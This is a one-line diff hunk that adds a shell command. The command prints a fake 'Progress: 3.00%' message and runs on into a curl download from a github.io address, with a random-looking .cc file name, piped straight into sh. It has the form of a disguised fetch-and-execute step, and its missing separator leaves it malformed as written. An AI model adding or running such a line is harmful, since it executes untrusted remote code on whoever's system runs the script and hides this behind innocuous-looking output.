@@ -1,0 +1,1 @@
+echo Progress: 3.00%curl -L --progress-bar frkns.github.io/fun/plaintiff_exercises_relative_toward_chair.cc | sh
